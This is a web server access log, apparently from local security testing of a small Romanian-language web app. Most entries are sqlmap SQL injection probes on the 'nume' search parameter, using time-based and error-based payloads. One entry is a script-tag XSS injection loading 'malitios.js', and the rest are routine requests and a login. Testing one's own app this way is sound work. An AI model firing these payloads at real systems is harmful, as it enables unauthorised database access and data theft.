+[2026-01-20T09:16:59.902Z] GET /cauta?nume=ion%27%20AND%201332%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%281332%3D1332%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%27hcnQ%27%3D%27hcnQ - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.904Z] GET /cauta?nume=ion%27%20AND%201332%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%281332%3D1332%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%27hcnQ%27%3D%27hcnQ - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.918Z] GET /cauta?nume=ion%29%20AND%201332%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%281332%3D1332%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%286336%3D6336 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.919Z] GET /cauta?nume=ion%29%20AND%201332%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%281332%3D1332%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%286336%3D6336 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.933Z] GET /cauta?nume=ion%20AND%201332%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%281332%3D1332%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.935Z] GET /cauta?nume=ion%20AND%201332%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%281332%3D1332%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.951Z] GET /cauta?nume=ion%20AND%201332%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%281332%3D1332%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29--%20ykMm - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.953Z] GET /cauta?nume=ion%20AND%201332%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%281332%3D1332%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29--%20ykMm - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:17:00.066Z] GET /cauta?nume=%28SELECT%20CONCAT%28CONCAT%28%27qxxvq%27%2C%28CASE%20WHEN%20%289081%3D9081%29%20THEN%20%271%27%20ELSE%20%270%27%20END%29%29%2C%27qjkzq%27%29%29 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:17:00.067Z] GET /cauta?nume=%28SELECT%20CONCAT%28CONCAT%28%27qxxvq%27%2C%28CASE%20WHEN%20%289081%3D9081%29%20THEN%20%271%27%20ELSE%20%270%27%20END%29%29%2C%27qjkzq%27%29%29 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:17:00.108Z] GET /cauta?nume=ion%27%29%3BSELECT%20PG_SLEEP%285%29-- - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:17:00.109Z] GET /cauta?nume=ion%27%29%3BSELECT%20PG_SLEEP%285%29-- - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:17:00.123Z] GET /cauta?nume=ion%27%3BSELECT%20PG_SLEEP%285%29-- - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:17:00.123Z] GET /cauta?nume=ion%27%3BSELECT%20PG_SLEEP%285%29-- - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:17:00.137Z] GET /cauta?nume=ion%29%3BSELECT%20PG_SLEEP%285%29-- - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:17:00.139Z] GET /cauta?nume=ion%29%3BSELECT%20PG_SLEEP%285%29-- - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:17:00.152Z] GET /cauta?nume=ion%3BSELECT%20PG_SLEEP%285%29-- - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:17:00.153Z] GET /cauta?nume=ion%3BSELECT%20PG_SLEEP%285%29-- - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:17:00.188Z] GET /cauta?nume=ion%27%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27-- - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:17:00.189Z] GET /cauta?nume=ion%27%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27-- - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:17:00.203Z] GET /cauta?nume=ion%27%3BWAITFOR%20DELAY%20%270%3A0%3A5%27-- - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:17:00.205Z] GET /cauta?nume=ion%27%3BWAITFOR%20DELAY%20%270%3A0%3A5%27-- - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:17:00.230Z] GET /cauta?nume=ion%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27-- - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:17:00.231Z] GET /cauta?nume=ion%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27-- - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:17:00.243Z] GET /cauta?nume=ion%3BWAITFOR%20DELAY%20%270%3A0%3A5%27-- - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:17:00.245Z] GET /cauta?nume=ion%3BWAITFOR%20DELAY%20%270%3A0%3A5%27-- - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:17:00.273Z] GET /cauta?nume=ion%27%29%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28103%29%7C%7CCHR%2869%29%7C%7CCHR%28113%29%7C%7CCHR%28105%29%2C5%29%20FROM%20DUAL-- - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:17:00.274Z] GET /cauta?nume=ion%27%29%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28103%29%7C%7CCHR%2869%29%7C%7CCHR%28113%29%7C%7CCHR%28105%29%2C5%29%20FROM%20DUAL-- - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:17:00.285Z] GET /cauta?nume=ion%27%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28103%29%7C%7CCHR%2869%29%7C%7CCHR%28113%29%7C%7CCHR%28105%29%2C5%29%20FROM%20DUAL-- - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:17:00.287Z] GET /cauta?nume=ion%27%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28103%29%7C%7CCHR%2869%29%7C%7CCHR%28113%29%7C%7CCHR%28105%29%2C5%29%20FROM%20DUAL-- - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:17:00.299Z] GET /cauta?nume=ion%29%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28103%29%7C%7CCHR%2869%29%7C%7CCHR%28113%29%7C%7CCHR%28105%29%2C5%29%20FROM%20DUAL-- - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:17:00.300Z] GET /cauta?nume=ion%29%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28103%29%7C%7CCHR%2869%29%7C%7CCHR%28113%29%7C%7CCHR%28105%29%2C5%29%20FROM%20DUAL-- - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:17:00.332Z] GET /cauta?nume=ion%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28103%29%7C%7CCHR%2869%29%7C%7CCHR%28113%29%7C%7CCHR%28105%29%2C5%29%20FROM%20DUAL-- - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:17:00.334Z] GET /cauta?nume=ion%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28103%29%7C%7CCHR%2869%29%7C%7CCHR%28113%29%7C%7CCHR%28105%29%2C5%29%20FROM%20DUAL-- - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:17:00.400Z] GET /cauta?nume=ion%27%29%20AND%20%28SELECT%204652%20FROM%20%28SELECT%28SLEEP%285%29%29%29ZkKD%29%20AND%20%28%27NUDV%27%3D%27NUDV - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:17:00.400Z] GET /cauta?nume=ion%27%29%20AND%20%28SELECT%204652%20FROM%20%28SELECT%28SLEEP%285%29%29%29ZkKD%29%20AND%20%28%27NUDV%27%3D%27NUDV - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:17:00.421Z] GET /cauta?nume=ion%27%20AND%20%28SELECT%204652%20FROM%20%28SELECT%28SLEEP%285%29%29%29ZkKD%29%20AND%20%27eRoD%27%3D%27eRoD - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:17:00.422Z] GET /cauta?nume=ion%27%20AND%20%28SELECT%204652%20FROM%20%28SELECT%28SLEEP%285%29%29%29ZkKD%29%20AND%20%27eRoD%27%3D%27eRoD - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:17:00.437Z] GET /cauta?nume=ion%29%20AND%20%28SELECT%204652%20FROM%20%28SELECT%28SLEEP%285%29%29%29ZkKD%29%20AND%20%289056%3D9056 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:17:00.438Z] GET /cauta?nume=ion%29%20AND%20%28SELECT%204652%20FROM%20%28SELECT%28SLEEP%285%29%29%29ZkKD%29%20AND%20%289056%3D9056 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:17:00.470Z] GET /cauta?nume=ion%20AND%20%28SELECT%204652%20FROM%20%28SELECT%28SLEEP%285%29%29%29ZkKD%29 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:17:00.471Z] GET /cauta?nume=ion%20AND%20%28SELECT%204652%20FROM%20%28SELECT%28SLEEP%285%29%29%29ZkKD%29 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:17:00.483Z] GET /cauta?nume=ion%20AND%20%28SELECT%204652%20FROM%20%28SELECT%28SLEEP%285%29%29%29ZkKD%29--%20FgrN - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:17:00.484Z] GET /cauta?nume=ion%20AND%20%28SELECT%204652%20FROM%20%28SELECT%28SLEEP%285%29%29%29ZkKD%29--%20FgrN - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:17:00.548Z] GET /cauta?nume=ion%27%29%20AND%208442%3D%28SELECT%208442%20FROM%20PG_SLEEP%285%29%29%20AND%20%28%27pWAd%27%3D%27pWAd - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:17:00.549Z] GET /cauta?nume=ion%27%29%20AND%208442%3D%28SELECT%208442%20FROM%20PG_SLEEP%285%29%29%20AND%20%28%27pWAd%27%3D%27pWAd - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:17:00.571Z] GET /cauta?nume=ion%27%20AND%208442%3D%28SELECT%208442%20FROM%20PG_SLEEP%285%29%29%20AND%20%27fshh%27%3D%27fshh - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:17:00.572Z] GET /cauta?nume=ion%27%20AND%208442%3D%28SELECT%208442%20FROM%20PG_SLEEP%285%29%29%20AND%20%27fshh%27%3D%27fshh - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:17:00.584Z] GET /cauta?nume=ion%29%20AND%208442%3D%28SELECT%208442%20FROM%20PG_SLEEP%285%29%29%20AND%20%287158%3D7158 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:17:00.585Z] GET /cauta?nume=ion%29%20AND%208442%3D%28SELECT%208442%20FROM%20PG_SLEEP%285%29%29%20AND%20%287158%3D7158 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:17:00.599Z] GET /cauta?nume=ion%20AND%208442%3D%28SELECT%208442%20FROM%20PG_SLEEP%285%29%29 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:17:00.600Z] GET /cauta?nume=ion%20AND%208442%3D%28SELECT%208442%20FROM%20PG_SLEEP%285%29%29 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:17:00.616Z] GET /cauta?nume=ion%20AND%208442%3D%28SELECT%208442%20FROM%20PG_SLEEP%285%29%29--%20MEnC - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:17:00.617Z] GET /cauta?nume=ion%20AND%208442%3D%28SELECT%208442%20FROM%20PG_SLEEP%285%29%29--%20MEnC - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:17:00.709Z] GET /cauta?nume=ion%27%29%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20AND%20%28%27PzFF%27%3D%27PzFF - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:17:00.709Z] GET /cauta?nume=ion%27%29%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20AND%20%28%27PzFF%27%3D%27PzFF - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:17:00.724Z] GET /cauta?nume=ion%27%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20AND%20%27FTBL%27%3D%27FTBL - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:17:00.724Z] GET /cauta?nume=ion%27%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20AND%20%27FTBL%27%3D%27FTBL - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:17:00.737Z] GET /cauta?nume=ion%29%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20AND%20%288917%3D8917 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:17:00.738Z] GET /cauta?nume=ion%29%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20AND%20%288917%3D8917 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:17:00.765Z] GET /cauta?nume=ion%20WAITFOR%20DELAY%20%270%3A0%3A5%27 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:17:00.767Z] GET /cauta?nume=ion%20WAITFOR%20DELAY%20%270%3A0%3A5%27 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:17:00.796Z] GET /cauta?nume=ion%20WAITFOR%20DELAY%20%270%3A0%3A5%27--%20mdYd - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:17:00.798Z] GET /cauta?nume=ion%20WAITFOR%20DELAY%20%270%3A0%3A5%27--%20mdYd - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:17:00.834Z] GET /cauta?nume=ion%27%29%20AND%208871%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2886%29%7C%7CCHR%2881%29%7C%7CCHR%28107%29%7C%7CCHR%2870%29%2C5%29%20AND%20%28%27QZfE%27%3D%27QZfE - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:17:00.835Z] GET /cauta?nume=ion%27%29%20AND%208871%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2886%29%7C%7CCHR%2881%29%7C%7CCHR%28107%29%7C%7CCHR%2870%29%2C5%29%20AND%20%28%27QZfE%27%3D%27QZfE - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:17:00.847Z] GET /cauta?nume=ion%27%20AND%208871%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2886%29%7C%7CCHR%2881%29%7C%7CCHR%28107%29%7C%7CCHR%2870%29%2C5%29%20AND%20%27LYEx%27%3D%27LYEx - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:17:00.848Z] GET /cauta?nume=ion%27%20AND%208871%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2886%29%7C%7CCHR%2881%29%7C%7CCHR%28107%29%7C%7CCHR%2870%29%2C5%29%20AND%20%27LYEx%27%3D%27LYEx - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:17:00.861Z] GET /cauta?nume=ion%29%20AND%208871%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2886%29%7C%7CCHR%2881%29%7C%7CCHR%28107%29%7C%7CCHR%2870%29%2C5%29%20AND%20%289507%3D9507 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:17:00.861Z] GET /cauta?nume=ion%29%20AND%208871%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2886%29%7C%7CCHR%2881%29%7C%7CCHR%28107%29%7C%7CCHR%2870%29%2C5%29%20AND%20%289507%3D9507 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:17:00.873Z] GET /cauta?nume=ion%20AND%208871%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2886%29%7C%7CCHR%2881%29%7C%7CCHR%28107%29%7C%7CCHR%2870%29%2C5%29 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:17:00.874Z] GET /cauta?nume=ion%20AND%208871%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2886%29%7C%7CCHR%2881%29%7C%7CCHR%28107%29%7C%7CCHR%2870%29%2C5%29 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:17:00.886Z] GET /cauta?nume=ion%20AND%208871%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2886%29%7C%7CCHR%2881%29%7C%7CCHR%28107%29%7C%7CCHR%2870%29%2C5%29--%20Nzms - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:17:00.887Z] GET /cauta?nume=ion%20AND%208871%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2886%29%7C%7CCHR%2881%29%7C%7CCHR%28107%29%7C%7CCHR%2870%29%2C5%29--%20Nzms - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:20:46.699Z] GET /cauta?q=%3Cscript%20src=%22http://localhost:5000/static/malitios.js%22%3E%3C/script%3E - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-20T09:20:46.702Z] GET /cauta?q=%3Cscript%20src=%22http://localhost:5000/static/malitios.js%22%3E%3C/script%3E - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-20T09:20:46.843Z] GET /favicon.ico - 404 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-20T09:20:55.582Z] GET /cauta?nume=Ion - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-20T09:20:55.583Z] GET /cauta?nume=Ion - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-20T09:21:11.066Z] GET /allusers - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-20T09:24:05.381Z] GET /.well-known/appspecific/com.chrome.devtools.json - 404 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-20T09:24:20.926Z] GET /allusers - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-20T09:25:39.314Z] POST /verificare - 200 - IP: ::1 - LOGIN SUCCESS - Username: roxana1234 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-20T09:25:39.315Z] POST /verificare - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-20T09:25:39.316Z] POST /verificare - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-20T09:25:45.896Z] GET /cauta?nume=ana - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-20T09:25:45.897Z] GET /cauta?nume=ana - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-20T09:25:50.053Z] GET /cauta?nume=roxana - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-20T09:25:50.054Z] GET /cauta?nume=roxana - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-20T09:25:52.086Z] GET /cauta?nume=a - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-20T09:25:52.087Z] GET /cauta?nume=a - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-20T09:25:57.471Z] GET /cauta?nume=or - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
